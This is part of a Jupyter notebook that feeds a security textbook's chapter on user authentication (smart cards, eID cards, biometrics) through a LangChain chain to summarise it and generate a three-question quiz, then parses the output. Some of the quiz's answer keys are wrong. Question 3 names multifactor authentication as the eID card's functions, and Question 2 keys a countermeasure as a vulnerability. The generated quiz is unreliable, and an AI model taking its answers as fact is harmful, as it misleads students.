      "] e v i t i s o p\n",
      "\n",
      "e s l a f [ r P\n",
      "\n",
      "0.01\n",
      "\n",
      "4 hash functions\n",
      "\n",
      "6 hash functions\n",
      "\n",
      "0.001\n",
      "\n",
      "0\n",
      "\n",
      "10 Ratio of hash table size (bits) to dictionary size (words)\n",
      "\n",
      "5\n",
      "\n",
      "15\n",
      "\n",
      "20\n",
      "\n",
      "Figure 3.5 Performance of Bloom Filter\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 103\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "104 CHAPTER 3 / UsER AUTHEnTiCATion\n",
      "\n",
      "password not in the dictionary. If we choose six hash functions, the required ratio is R = 9.6. Therefore, we need a hash table of 9.6 * 106 bits or about 1.2 MB of storage. In contrast, storage of the entire dictionary would require on the order of 8 MB. Thus, we achieve a compression of almost a factor of 7. Furthermore, password checking involves the straightforward calculation of six hash functions and is independent of the size of the dictionary, whereas with the use of the full dictionary, there is substan- tial searching.2\n",
      "\n",
      "3.3 TOKEN-BASED AUTHENTICATION\n",
      "\n",
      "Objects that a user possesses for the purpose of user authentication are called tokens. In this section, we examine two types of tokens that are widely used; these are cards that have the appearance and size of bank cards (see Table 3.3).\n",
      "\n",
      "Memory Cards\n",
      "\n",
      "Memory cards can store but not process data. The most common such card is the bank card with a magnetic stripe on the back. A magnetic stripe can store only a simple security code, which can be read (and unfortunately reprogrammed) by an inexpensive card reader. There are also memory cards that include an internal electronic memory. Memory cards can be used alone for physical access, such as a hotel room. For authentication, a user provides both the memory card and some form of password or personal identification number (PIN). A typical application is an automatic teller machine (ATM). The memory card, when combined with a PIN or password, provides significantly greater security than a password alone. An adversary must gain physical possession of the card (or be able to duplicate it) plus must gain knowledge of the PIN. Among the potential drawbacks NIST SP 800-12 (An Introduction to Computer Security: The NIST Handbook, October 1995) notes the following:\n",
      "\n",
      "Requires special reader: This increases the cost of using the token and creates the requirement to maintain the security of the reader’s hardware and software.\n",
      "\n",
      "Table 3.3 Types of Cards Used as Tokens\n",
      "\n",
      "Card Type\n",
      "\n",
      "Defining Feature\n",
      "\n",
      "Example\n",
      "\n",
      "Embossed\n",
      "\n",
      "Raised characters only, on front\n",
      "\n",
      "Old credit card\n",
      "\n",
      "Magnetic stripe\n",
      "\n",
      "Magnetic bar on back, characters on front\n",
      "\n",
      "Bank card\n",
      "\n",
      "Memory\n",
      "\n",
      "Electronic memory inside\n",
      "\n",
      "Prepaid phone card\n",
      "\n",
      "Smart Contact Contactless\n",
      "\n",
      "Electronic memory and processor inside Electrical contacts exposed on surface Radio antenna embedded inside\n",
      "\n",
      "Biometric ID card\n",
      "\n",
      "2The Bloom filter involves the use of probabilistic techniques. There is a small probability that some passwords not in the dictionary will be rejected. It is often the case in designing algorithms that the use of probabilistic techniques results in a less time-consuming or less complex solution, or both.\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 104\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "3.3 / ToKEn-BAsED AUTHEnTiCATion 105\n",
      "\n",
      "Token loss: A lost token temporarily prevents its owner from gaining system access. Thus, there is an administrative cost in replacing the lost token. In addition, if the token is found, stolen, or forged, then an adversary need only determine the PIN to gain unauthorized access.\n",
      "\n",
      "User dissatisfaction: Although users may have no difficulty in accepting the use of a memory card for ATM access, its use for computer access may be deemed inconvenient.\n",
      "\n",
      "Smart Cards\n",
      "\n",
      "A wide variety of devices qualify as smart tokens. These can be categorized along four dimensions that are not mutually exclusive:\n",
      "\n",
      "Physical characteristics: Smart tokens include an embedded microprocessor. A smart token that looks like a bank card is called a smart card. Other smart tokens can look like calculators, keys, or other small portable objects.\n",
      "\n",
      "User interface: Manual interfaces include a keypad and display for human/ token interaction.\n",
      "\n",
      "Electronic interface: A smart card or other token requires an electronic inter- face to communicate with a compatible reader/writer. A card may have one or both of the following types of interface: — Contact: A contact smart card must be inserted into a smart card reader with a direct connection to a conductive contact plate on the surface of the card (typically gold plated). Transmission of commands, data, and card status takes place over these physical contact points.```\n",
      "\u001b[0m\n",
      "Prompt after formatting:\n",
      "\u001b[32;1m\u001b[1;3m\n",
      "Summarize the following text delimited by triple backquotes.\n",
      "The summary should contain the key points of the text and help students revise.\n",
      "```Smart Cards\n",
      "\n",
      "A wide variety of devices qualify as smart tokens. These can be categorized along four dimensions that are not mutually exclusive:\n",
      "\n",
      "Physical characteristics: Smart tokens include an embedded microprocessor. A smart token that looks like a bank card is called a smart card. Other smart tokens can look like calculators, keys, or other small portable objects.\n",
      "\n",
      "User interface: Manual interfaces include a keypad and display for human/ token interaction.\n",
      "\n",
      "Electronic interface: A smart card or other token requires an electronic inter- face to communicate with a compatible reader/writer. A card may have one or both of the following types of interface: — Contact: A contact smart card must be inserted into a smart card reader with a direct connection to a conductive contact plate on the surface of the card (typically gold plated). Transmission of commands, data, and card status takes place over these physical contact points.\n",
      "\n",
      "— Contactless: A contactless card requires only close proximity to a reader. Both the reader and the card have an antenna, and the two communicate using radio frequencies. Most contactless cards also derive power for the internal chip from this electromagnetic signal. The range is typically one-half to three inches for non-battery-powered cards, ideal for applications such as building entry and payment that require a very fast card interface.\n",
      "\n",
      "Authentication protocol: The purpose of a smart token is to provide a means for user authentication. We can classify the authentication protocols used with smart tokens into three categories: — Static: With a static protocol, the user authenticates himself or herself to the token then the token authenticates the user to the computer. The latter half of this protocol is similar to the operation of a memory token.\n",
      "\n",
      "— Dynamic password generator: In this case, the token generates a unique password periodically (e.g., every minute). This password is then entered into the computer system for authentication, either manually by the user or electronically via the token. The token and the computer system must be initialized and kept synchronized so the computer knows the password that is current for this token.\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 105\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "106 CHAPTER 3 / UsER AUTHEnTiCATion\n",
      "\n",
      "— Challenge-response: In this case, the computer system generates a challenge, such as a random string of numbers. The smart token generates a response based on the challenge. For example, public-key cryptography could be used and the token could encrypt the challenge string with the token’s private key.\n",
      "\n",
      "For user authentication, the most important category of smart token is the smart card, which has the appearance of a credit card, has an electronic interface, and may use any of the type of protocols just described. The remainder of this section discusses smart cards.\n",
      "\n",
      "A smart card contains within it an entire microprocessor, including processor, memory, and I/O ports. Some versions incorporate a special co-processing circuit for cryptographic operation to speed the task of encoding and decoding messages or generating digital signatures to validate the information transferred. In some cards, the I/O ports are directly accessible by a compatible reader by means of exposed electrical contacts. Other cards rely instead on an embedded antenna for wireless communication with the reader.\n",
      "\n",
      "A typical smart card includes three types of memory. Read-only memory (ROM) stores data that does not change during the card’s life, such as the card number and the cardholder’s name. Electrically erasable programmable ROM (EEPROM) holds application data and programs, such as the protocols that the card can execute. It also holds data that may vary with time. For example, in a telephone card, the EEPROM holds the remaining talk time. Random access memory (RAM) holds temporary data generated when applications are executed.\n",
      "\n",
      "Figure 3.6 illustrates the typical interaction between a smart card and a reader or computer system. Each time the card is inserted into a reader, a reset is initiated by the reader to initialize parameters such as clock value. After the reset function is performed, the card responds with answer to reset (ATR) message. This message defines the parameters and protocols that the card can use and the functions it can perform. The terminal may be able to change the protocol used and other parameters via a protocol type selection (PTS) command. The card’s PTS response confirms the protocols and parameters to be used. The terminal and card can now execute the protocol to perform the desired application.\n",
      "\n",
      "Electronic Identity Cards\n",
      "\n",
      "An application of increasing importance is the use of a smart card as a national identity card for citizens. A national electronic identity (eID) card can serve the same purposes as other national ID cards, and similar cards such as a driver’s license, for access to government and commercial services. In addition, an eID card can provide stronger proof of identity and be used in a wider variety of applications. In effect, an eID card is a smart card that has been verified by the national government as valid and authentic.\n",
      "\n",
      "One of the most recent and most advanced eID deployments is the German eID card neuer Personalausweis [POLL12]. The card has human-readable data printed on its surface, including the following:\n",
      "\n",
      "Personal data: Such as name, date of birth, and address; this is the type of printed information found on passports and drivers’ licenses.\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 106\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "3.3 / ToKEn-BAsED AUTHEnTiCATion 107\n",
      "\n",
      "dractramS\n",
      "\n",
      "Smart Card Activation\n",
      "\n",
      "ATR\n",
      "\n",
      "Protocol negotiation PTS\n",
      "\n",
      "Negotiation Answer PTS\n",
      "\n",
      "Command APDU\n",
      "\n",
      "Response APDU\n",
      "\n",
      "End of Session\n",
      "\n",
      "APDU = Application protocol data unit ATR = Answer to reset PTS = Protocol type selection\n",
      "\n",
      "Figure 3.6 Smart Card/Reader Exchange\n",
      "\n",
      "Document number: An alphanumerical nine-character unique identifier of each card.\n",
      "\n",
      "Card access number (CAN): A six-digit decimal random number printed on the face of the card. This is used as a password, as explained subsequently.\n",
      "\n",
      "Machine readable zone (MRZ): Three lines of human- and machine-readable text on the back of the card. This may also be used as a password.\n",
      "\n",
      "eid functions The card has the following three separate electronic functions, each with its own protected dataset (see Table 3.4):\n",
      "\n",
      "ePass: This function is reserved for government use and stores a digital repre- sentation of the cardholder’s identity. This function is similar to, and may be used for, an electronic passport. Other government services may also use ePass. The ePass function must be implemented on the card.\n",
      "\n",
      "eID: This function is for general-purpose use in a variety of government and commercial applications. The eID function stores an identity record that autho- rized service can access with cardholder permission. Citizens choose whether they want this function activated.\n",
      "\n",
      "eSign: This optional function stores a private key and a certificate verifying the key; it is used for generating a digital signature. A private sector trust center issues the certificate.\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 107\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "108 CHAPTER 3 / UsER AUTHEnTiCATion\n",
      "\n",
      "Table 3.4 Electronic Functions and Data for eID Cards\n",
      "\n",
      "Function\n",
      "\n",
      "Purpose\n",
      "\n",
      "PACE Password\n",
      "\n",
      "Data\n",
      "\n",
      "Uses\n",
      "\n",
      "ePass (mandatory)\n",
      "\n",
      "Authorized offline inspection systems read the data.\n",
      "\n",
      "CAN or MRZ\n",
      "\n",
      "Face image; two fingerprint images (optional); MRZ data\n",
      "\n",
      "Offline biometric identity verifica- tion reserved for government access\n",
      "\n",
      "eID (activation optional)\n",
      "\n",
      "Online applica- tions read the data or access functions as authorized.\n",
      "\n",
      "Offline inspection systems read the data and update the address and community ID.\n",
      "\n",
      "eID PIN\n",
      "\n",
      "CAN or MRZ\n",
      "\n",
      "Family and given names; artistic name and doctoral degree: date and place of birth; address and community ID; expiration date\n",
      "\n",
      "Identification; age verification; com- munity ID verifi- cation; restricted identification (pseudonym); revocation query\n",
      "\n",
      "eSign (certificate optional)\n",
      "\n",
      "A certification authority installs the signature certificate online.\n",
      "\n",
      "Citizens make electronic signa- ture with eSign PIN.\n",
      "\n",
      "eID PIN\n",
      "\n",
      "CAN\n",
      "\n",
      "Signature key; X.509 certificate\n",
      "\n",
      "Electronic signature creation\n",
      "\n",
      "CAN = card access number MRZ = machine@readable zone PACE = password authenticated connection establishment PIN = personal identification number\n",
      "\n",
      "The ePass -function is an offline function. That is, it is not used over a network, but is used in a situation where the cardholder presents the card for a particular ser- vice at that location, such as going through a passport control checkpoint.\n",
      "\n",
      "The eID function can be used for both online and offline services. An exam- ple of an offline use is an inspection system. An inspection system is a terminal for law enforcement checks, for example, by police or border control officers. An inspection system can read identifying information of the cardholder as well as bio- metric information stored on the card, such as facial image and fingerprints. The biometric information can be used to verify that the individual in possession of the card is the actual cardholder.\n",
      "\n",
      "User authentication is a good example of online use of the eID function. Figure 3.7 illustrates a Web-based scenario. To begin, an eID user visits a website and requests a service that requires authentication. The Web site sends back a redirect message that forward an authentication request to an eID server. The eID server requests that the user enter the PIN number for the eID card. Once the user has correctly entered the PIN, data can be exchanged between the eID card and the terminal reader in encrypted form. The server then engages in an authentication protocol exchange with the microprocessor on the eID card. If the user is authenti- cated, the results are sent back to the user system to be redirected to the Web server application.\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 108\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "3.4 / BioMETRiC AUTHEnTiCATion 109\n",
      "\n",
      "6. User enters PIN\n",
      "\n",
      "7 .\n",
      "\n",
      "8 .\n",
      "\n",
      "t\n",
      "\n",
      "e q u e\n",
      "\n",
      "s\n",
      "\n",
      "i o n r\n",
      "\n",
      "c a t\n",
      "\n",
      "i\n",
      "\n",
      "A u t h e n t e x c h a n g e e q u e P I N r i o n p r o t o c o l 5 . e d i f o r r i A u t h e n t s u l i o n r A u t h e n t\n",
      "\n",
      "4 .\n",
      "\n",
      "t\n",
      "\n",
      "s\n",
      "\n",
      "c a t c a t\n",
      "\n",
      "t\n",
      "\n",
      "e\n",
      "\n",
      "i\n",
      "\n",
      "eID server\n",
      "\n",
      "1. User requests service (e.g., via Web browser)\n",
      "\n",
      "2. Service request 3. Redirect to eID message 9. Authentication result forwarded 10. Service granted\n",
      "\n",
      "Host/application server\n",
      "\n",
      "Figure 3.7 User Authentication with eID\n",
      "\n",
      "For the preceding scenario, the appropriate software and hardware are required on the user system. Software on the main user system includes functionality for requesting and accepting the PIN number and for message redirection. The hard- ware required is an eID card reader. The card reader can be an external contact or contactless reader or a contactless reader internal to the user system.\n",
      "\n",
      "PAssword AuthenticAted connection estABLishment (PAce) Password Authenticated Connection Establishment (PACE) ensures that the contactless RF chip in the eID card cannot be read without explicit access control. For online appli- cations, access to the card is established by the user entering the 6-digit PIN, which should only be known to the holder of the card. For offline applications, either the MRZ printed on the back of the card or the six-digit card access number (CAN) printed on the front is used.\n",
      "\n",
      "3.4 BIOMETRIC AUTHENTICATION\n",
      "\n",
      "A biometric authentication system attempts to authenticate an individual based on his or her unique physical characteristics. These include static characteristics, such as fingerprints, hand geometry, facial characteristics, and retinal and iris patterns;\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 109\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "110 CHAPTER 3 / UsER AUTHEnTiCATion\n",
      "\n",
      "and dynamic characteristics, such as voiceprint and signature. In essence, biomet- rics is based on pattern recognition. Compared to passwords and tokens, biometric authentication is both technically more complex and expensive. While it is used in a number of specific applications, biometrics has yet to mature as a standard tool for user authentication to computer systems.\n",
      "\n",
      "Physical Characteristics Used in Biometric Applications\n",
      "\n",
      "A number of different types of physical characteristics are either in use or under study for user authentication. The most common are the following:\n",
      "\n",
      "Facial characteristics: Facial characteristics are the most common means of human-to-human identification; thus it is natural to consider them for identification by computer. The most common approach is to define charac- teristics based on relative location and shape of key facial features, such as eyes, eyebrows, nose, lips, and chin shape. An alternative approach is to use an infrared camera to produce a face thermogram that correlates with the underly- ing vascular system in the human face.\n",
      "\n",
      "Fingerprints: Fingerprints have been used as a means of identification for cen- turies, and the process has been systematized and automated particularly for law enforcement purposes. A fingerprint is the pattern of ridges and furrows on the surface of the fingertip. Fingerprints are believed to be unique across the entire human population. In practice, automated fingerprint recognition and matching system extract a number of features from the fingerprint for storage as a numerical surrogate for the full fingerprint pattern.\n",
      "\n",
      "Hand geometry: Hand geometry systems identify features of the hand, includ- ing shape, and lengths and widths of fingers.\n",
      "\n",
      "Retinal pattern: The pattern formed by veins beneath the retinal surface is unique and therefore suitable for identification. A retinal biometric system obtains a digital image of the retinal pattern by projecting a low-intensity beam of visual or infrared light into the eye.\n",
      "\n",
      "Iris: Another unique physical characteristic is the detailed structure of the iris. • Signature: Each individual has a unique style of handwriting and this is reflected especially in the signature, which is typically a frequently written sequence. However, multiple signature samples from a single individual will not be identi- cal. This complicates the task of developing a computer representation of the signature that can be matched to future samples.\n",
      "\n",
      "Voice: Whereas the signature style of an individual reflects not only the unique physical attributes of the writer but also the writing habit that has developed, voice patterns are more closely tied to the physical and anatomical characteris- tics of the speaker. Nevertheless, there is still a variation from sample to sample over time from the same speaker, complicating the biometric recognition task.\n",
      "\n",
      "Figure 3.8 gives a rough indication of the relative cost and accuracy of these biometric measures. The concept of accuracy does not apply to user authentication schemes using smart cards or passwords. For example, if a user enters a password, it either matches exactly the password expected for that user or not. In the case of\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 110\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "3.4 / BioMETRiC AUTHEnTiCATion 111\n",
      "\n",
      "Hand\n",
      "\n",
      "Iris\n",
      "\n",
      "t s o C\n",
      "\n",
      "Signature\n",
      "\n",
      "Retina\n",
      "\n",
      "Face\n",
      "\n",
      "Finger\n",
      "\n",
      "Voice\n",
      "\n",
      "Accuracy\n",
      "\n",
      "Figure 3.8 Cost Versus Accuracy of Various Biometric Characteristics in User Authentication Schemes\n",
      "\n",
      "biometric parameters, the system instead must determine how closely a presented biometric characteristic matches a stored characteristic. Before elaborating on the concept of biometric accuracy, we need to have a general idea of how biometric systems work.\n",
      "\n",
      "Operation of a Biometric Authentication System\n",
      "\n",
      "Figure 3.9 illustrates the operation of a biometric system. Each individual who is to be included in the database of authorized users must first be enrolled in the system. This is analogous to assigning a password to a user. For a biometric system, the user pres- ents a name and, typically, some type of password or PIN to the system. At the same time, the system senses some biometric characteristic of this user (e.g., fingerprint of right index finger). The system digitizes the input then extracts a set of features that can be stored as a number or set of numbers representing this unique biometric characteristic; this set of numbers is referred to as the user’s template. The user is now enrolled in the system, which maintains for the user a name (ID), perhaps a PIN or password, and the biometric value.\n",
      "\n",
      "Depending on application, user authentication on a biometric system involves either verification or identification. Verification is analogous to a user logging on to a system by using a memory card or smart card coupled with a password or PIN. For biometric verification, the user enters a PIN and also uses a biometric sensor. The system extracts the corresponding feature and compares that to the template stored for this user. If there is a match, then the system authenticates this user.\n",
      "\n",
      "For an identification system, the individual uses the biometric sensor but pres- ents no additional information. The system then compares the presented template with the set of stored templates. If there is a match, then this user is identified. Oth- erwise, the user is rejected.\n",
      "\n",
      "Biometric Accuracy\n",
      "\n",
      "In any biometric scheme, some physical characteristic of the individual is mapped into a digital representation. For each individual, a single digital representation, or\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 111\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "112 CHAPTER 3 / UsER AUTHEnTiCATion\n",
      "\n",
      "Name (PIN)\n",
      "\n",
      "Biometric sensor\n",
      "\n",
      "Feature extractor\n",
      "\n",
      "Biometric database\n",
      "\n",
      "User interface\n",
      "\n",
      "(a) Enrollment\n",
      "\n",
      "Name (PIN)\n",
      "\n",
      "Biometric sensor\n",
      "\n",
      "Feature extractor\n",
      "\n",
      "Biometric database\n",
      "\n",
      "User interface\n",
      "\n",
      "True/false\n",
      "\n",
      "Feature matcher\n",
      "\n",
      "One template\n",
      "\n",
      "(b) Veriﬁcation\n",
      "\n",
      "Biometric sensor\n",
      "\n",
      "Feature extractor\n",
      "\n",
      "Biometric database\n",
      "\n",
      "User interface\n",
      "\n",
      "User’s identity or “user unidentiﬁed”\n",
      "\n",
      "Feature matcher\n",
      "\n",
      "N templates\n",
      "\n",
      "(c) Identiﬁcation\n",
      "\n",
      "Figure 3.9 A Generic Biometric System Enrollment creates an association between a user and the user’s biometric characteristics. Depending on the appli- cation, user authentication either involves verifying that a claimed user is the actual user or identifying an unknown user.\n",
      "\n",
      "template, is stored in the computer. When the user is to be authenticated, the system compares the stored template to the presented template. Given the complexities of physical characteristics, we cannot expect that there will be an exact match between the two templates. Rather, the system uses an algorithm to generate a matching score (typically a single number) that quantifies the similarity between the input and the stored template. To proceed with the discussion, we define the following terms. The false match rate is the frequency with which biometric samples from different sources are erroneously assessed to be from the same source. The false nonmatch rate is the frequency with which samples from the same source are erroneously assessed to be from different sources.\n",
      "\n",
      "Figure 3.10 illustrates the dilemma posed to the system. If a single user is tested by the system numerous times, the matching score s will vary, with a probability\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 112\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "3.4 / BioMETRiC AUTHEnTiCATion 113\n",
      "\n",
      "Probability density function\n",
      "\n",
      "Imposter proﬁle\n",
      "\n",
      "Decision threshold (t)\n",
      "\n",
      "Proﬁle of genuine user\n",
      "\n",
      "False nonmatch possible\n",
      "\n",
      "False match possible\n",
      "\n",
      "Average matching value of imposter\n",
      "\n",
      "Average matching value of genuine user\n",
      "\n",
      "Matching score (s)\n",
      "\n",
      "Figure 3.10 Profiles of a Biometric Characteristic of an Imposter and an Authorized User In this depiction, the comparison between the presented feature and a reference feature is reduced to a single numeric value. If the input value (s) is greater than a preassigned threshold (t), a match is declared.```\n",
      "\u001b[0m\n",
      "\n",
      "\u001b[1m> Finished chain.\u001b[0m\n",
      "\n",
      "\n",
      "\u001b[1m> Entering new LLMChain chain...\u001b[0m\n",
      "Prompt after formatting:\n",
      "\u001b[32;1m\u001b[1;3m\n",
      "Using the content provided below from a PDF delimited by triple backquotes, \n",
      "please generate a multiple-choice test consisting of 3 questions to aid students in their review. \n",
      "Each question should be related to the key concepts, facts, or information in the text, and following the specific format below:\n",
      "Begin each question with the word \"Question\" and a number, followed by a colon.\n",
      "Then, provide the options for the question beginning with the word \"Options\" and a colon.\n",
      "Each option should begin with a letter (A, B, C, or D) followed by a period and a space.\n",
      "Ensure that for each question, there is one correct answer and three plausible but incorrect options. \n",
      "End each question with the word \"Answer\" and a colon, followed by the correct answer.\n",
      "    \n",
      "```The text discusses the characteristics of a uniform distribution of numbers, the importance of independence in sequences, the use of random sequences for cryptography, the difference between random and pseudorandom numbers, and practical applications of encryption for stored data. It also includes review questions and problems related to these topics.\n",
      "\n",
      "The text discusses the principles of digital user authentication and the means of authenticating a user's identity. It introduces the concept of assurance level, potential impact, and areas of risk in the context of user authentication. The text also provides an overview of different means of user authentication, including something the individual knows, possesses, is, and does. Additionally, it mentions the use of multifactor authentication for enhanced security. The chapter emphasizes the importance of user authentication as the fundamental building block of computer security and the primary line of defense. It also introduces a model for digital user authentication and discusses the different levels of assurance and potential impact.\n",
      "\n",
      "The text provides information on user authentication, focusing on password-based authentication. It discusses the vulnerability of passwords and various attack strategies and countermeasures. The use of hashed passwords and salt values, as well as the implementation of the UNIX password scheme, are explained. The text also delves into the effectiveness of password cracking, using examples of successful guessing strategies. Overall, the text highlights the security vulnerabilities of passwords and the need for stronger authentication techniques.\n",
      "\n",
      "The text discusses various strategies and techniques for password-based authentication, as well as the use of tokens for user authentication. It highlights the vulnerabilities of password-based authentication and the need for complex password policies to prevent password cracking. The text also explains the use of memory cards and smart cards as tokens for user authentication, discussing their physical characteristics and potential drawbacks.\n",
      "\n",
      "Smart tokens, including smart cards, have physical characteristics, user interface, electronic interface, and authentication protocols. Smart cards contain a microprocessor, memory, and I/O ports, and can be used for authentication. Electronic identity (eID) cards have functions for government and commercial use, and use biometric authentication for user verification. Biometric authentication uses physical characteristics like facial features, fingerprints, hand geometry, retinal and iris patterns, and voice to authenticate individuals. Biometric systems enroll users, verify their identity, and identify unknown users using matching scores. The false match rate and false nonmatch rate determine the accuracy of biometric authentication.```\n",
      "\u001b[0m\n",
      "\n",
      "\u001b[1m> Finished chain.\u001b[0m\n",
      "\n",
      "\u001b[1m> Finished chain.\u001b[0m\n",
      "Callback: \n",
      "Tokens Used: 22959\n",
      "\tPrompt Tokens: 22248\n",
      "\tCompletion Tokens: 711\n",
      "Successful Requests: 6\n",
      "Total Cost (USD): $0.023670000000000004\n"
     ]
    }
   ],
   "source": [
    "from langchain_community.callbacks import get_openai_callback\n",
    "\n",
    "with get_openai_callback() as cb:\n",
    "    output = quiz_chain.invoke(docs)\n",
    "    print(f\"Callback: \\n{cb}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "dict_keys(['input_documents', 'output_text'])\n",
      "Question 1: What are the principles of digital user authentication discussed in the text?\n",
      "Options: \n",
      "A. Random and pseudorandom numbers \n",
      "B. Importance of independence in sequences \n",
      "C. Something the individual knows, possesses, is, and does \n",
      "D. Use of multifactor authentication for enhanced security\n",
      "Answer: C. Something the individual knows, possesses, is, and does\n",
      "\n",
      "Question 2: What are the vulnerabilities of password-based authentication highlighted in the text?\n",
      "Options: \n",
      "A. Use of memory cards and smart cards \n",
      "B. Hashed passwords and salt values \n",
      "C. The need for complex password policies to prevent password cracking \n",
      "D. Use of multifactor authentication for enhanced security\n",
      "Answer: C. The need for complex password policies to prevent password cracking\n",
      "\n",
      "Question 3: What are the functions of electronic identity (eID) cards mentioned in the text?\n",
      "Options: \n",
      "A. Microprocessor, memory, and I/O ports \n",
      "B. Use of multifactor authentication for enhanced security \n",
      "C. Biometric authentication for user verification \n",
      "D. False match rate and false nonmatch rate determine the accuracy of biometric authentication\n",
      "Answer: B. Use of multifactor authentication for enhanced security\n"
     ]
    }
   ],
   "source": [
    "print(output.keys())\n",
    "print(output['output_text'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The text discusses the characteristics of a uniform distribution of numbers, the importance of independence in sequences, the use of random sequences for cryptography, the difference between random and pseudorandom numbers, and practical applications of encryption for stored data. It also includes review questions and problems related to these topics.\n",
    "\n",
    "The text discusses the principles of digital user authentication and the means of authenticating a user's identity. It introduces the concept of assurance level, potential impact, and areas of risk in the context of user authentication. The text also provides an overview of different means of user authentication, including something the individual knows, possesses, is, and does. Additionally, it mentions the use of multifactor authentication for enhanced security. The chapter emphasizes the importance of user authentication as the fundamental building block of computer security and the primary line of defense. It also introduces a model for digital user authentication and discusses the different levels of assurance and potential impact.\n",
    "\n",
    "The text provides information on user authentication, focusing on password-based authentication. It discusses the vulnerability of passwords and various attack strategies and countermeasures. The use of hashed passwords and salt values, as well as the implementation of the UNIX password scheme, are explained. The text also delves into the effectiveness of password cracking, using examples of successful guessing strategies. Overall, the text highlights the security vulnerabilities of passwords and the need for stronger authentication techniques.\n",
    "\n",
    "The text discusses various strategies and techniques for password-based authentication, as well as the use of tokens for user authentication. It highlights the vulnerabilities of password-based authentication and the need for complex password policies to prevent password cracking. The text also explains the use of memory cards and smart cards as tokens for user authentication, discussing their physical characteristics and potential drawbacks.\n",
    "\n",
    "Smart tokens, including smart cards, have physical characteristics, user interface, electronic interface, and authentication protocols. Smart cards contain a microprocessor, memory, and I/O ports, and can be used for authentication. Electronic identity (eID) cards have functions for government and commercial use, and use biometric authentication for user verification. Biometric authentication uses physical characteristics like facial features, fingerprints, hand geometry, retinal and iris patterns, and voice to authenticate individuals. Biometric systems enroll users, verify their identity, and identify unknown users using matching scores. The false match rate and false nonmatch rate determine the accuracy of biometric authentication."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [],
   "source": [
    "questions_list = [{\"question\": re.split(r\"\\nOptions:\", q)[0],\n",
    "                    \"options\": re.split(r\"\\n([A, B, C, D])\", re.split(r\"\\nAnswer: \", re.split(r'Options:', q)[1])[0]),\n",
    "                    \"answer\": re.split(r\"\\nAnswer:\", q)[1]}\n",
    "                    for q in re.split(r'Question \\d+: ', output['output_text']) if q != \"\"]\n",
    "questions_list = [{\"question\": q[\"question\"], \"options\": [\"\".join(x).strip() for x in zip(q[\"options\"][1::2], q[\"options\"][2::2])], \"answer\": q[\"answer\"].strip()} for q in questions_list]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[{'question': 'What are the principles of digital user authentication discussed in the text?',\n",
       "  'options': ['A. Random and pseudorandom numbers',\n",
       "   'B. Importance of independence in sequences',\n",
       "   'C. Something the individual knows, possesses, is, and does',\n",
       "   'D. Use of multifactor authentication for enhanced security'],\n",
       "  'answer': 'C. Something the individual knows, possesses, is, and does'},\n",
       " {'question': 'What are the vulnerabilities of password-based authentication highlighted in the text?',\n",
       "  'options': ['A. Use of memory cards and smart cards',\n",
       "   'B. Hashed passwords and salt values',\n",
       "   'C. The need for complex password policies to prevent password cracking',\n",
       "   'D. Use of multifactor authentication for enhanced security'],\n",
       "  'answer': 'C. The need for complex password policies to prevent password cracking'},\n",
       " {'question': 'What are the functions of electronic identity (eID) cards mentioned in the text?',\n",
       "  'options': ['A. Microprocessor, memory, and I/O ports',\n",
       "   'B. Use of multifactor authentication for enhanced security',\n",
       "   'C. Biometric authentication for user verification',\n",
       "   'D. False match rate and false nonmatch rate determine the accuracy of biometric authentication'],\n",
       "  'answer': 'B. Use of multifactor authentication for enhanced security'}]"
      ]
     },
     "execution_count": 52,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "questions_list"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## TODO: Cluster"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "When using cluster to generate quiz with GPT3.5 without map reduce, there is limitation of 16k for the token. For GPT 4 is 128k, but it is too expensive. \n",
    "\n",
    "Template length is about 700. \n",
    "\n",
    "(num_clusters * chunk_size + 700) / 4 < 16,000\n",
    "\n",
    "num_clusters * chunck_size < 63,300"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "dict_keys(['ids', 'embeddings', 'metadatas', 'documents', 'uris', 'data'])"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "db.get().keys()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Embeddings count: 68\n",
      "Documents count: 68\n"
     ]
    }
   ],
   "source": [
    "vectors = db.get(include=[\"embeddings\"])[\"embeddings\"]\n",
    "documents = db.get()[\"documents\"]\n",
    "print(f\"Embeddings count: {len(vectors)}\")\n",
    "print(f\"Documents count: {len(documents)}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
